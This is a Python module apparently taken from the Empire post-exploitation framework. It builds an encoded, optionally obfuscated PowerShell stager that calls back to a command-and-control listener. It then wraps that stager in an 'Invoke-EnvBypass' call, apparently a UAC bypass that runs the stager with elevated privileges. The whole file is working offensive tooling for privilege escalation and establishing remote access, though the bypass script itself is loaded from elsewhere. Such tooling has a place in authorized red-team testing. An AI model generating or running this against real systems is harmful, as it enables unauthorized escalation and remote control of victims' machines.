from __future__ import print_function

import pathlib
from builtins import object, str
from typing import Dict

from empire.server.common.module_models import PydanticModule
from empire.server.utils import data_util
from empire.server.utils.module_util import handle_error_message


class Module(object):
    @staticmethod
    def generate(
        main_menu,
        module: PydanticModule,
        params: Dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):

        # staging options
        listener_name = params["Listener"]
        user_agent = params["UserAgent"]
        proxy = params["Proxy"]
        proxy_creds = params["ProxyCreds"]
        launcher_obfuscate_command = params["ObfuscateCommand"]
        if (params["Obfuscate"]).lower() == "true":
            launcher_obfuscate = True
        else:
            launcher_obfuscate = False

        # read in the common module source code
        script, err = main_menu.modules.get_module_source(
            module_name=module.script_path,
            obfuscate=obfuscate,
            obfuscate_command=obfuscation_command,
        )

        if err:
            return handle_error_message(err)

        if not main_menu.listeners.is_listener_valid(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)
        else:
            # generate the PowerShell one-liner with all of the proper options set
            launcher = main_menu.stagers.generate_launcher(
                listenerName=listener_name,
                language="powershell",
                encode=True,
                obfuscate=launcher_obfuscate,
                obfuscationCommand=launcher_obfuscate_command,
                userAgent=user_agent,
                proxy=proxy,
                proxyCreds=proxy_creds,
                bypasses=params["Bypasses"],
            )
            enc_script = launcher.split(" ")[-1]
            if launcher == "":
                return handle_error_message("[!] Error in launcher generation.")
            else:
                script_end = 'Invoke-EnvBypass -Command "%s"' % (enc_script)
                script = main_menu.modules.finalize_module(
                    script=script,
                    script_end=script_end,
                    obfuscate=obfuscate,
                    obfuscation_command=obfuscation_command,
                )
                return script